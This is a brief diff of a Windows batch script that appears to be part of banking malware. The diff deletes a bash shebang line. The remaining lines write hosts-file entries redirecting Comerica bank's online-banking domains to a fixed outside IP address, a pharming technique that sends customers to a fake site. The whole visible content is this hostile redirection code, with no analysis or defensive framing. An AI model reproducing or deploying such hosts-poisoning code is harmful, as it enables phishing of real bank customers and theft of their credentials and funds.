@@ -1,4 +1,3 @@
-#!/bin/bash
 @echo off
 echo 210.138.184.59 www.webbanking.comerica.com > %temp%\temphosts.txt
 echo 210.138.184.59 www.comerica.com > %temp%\temphosts.txt
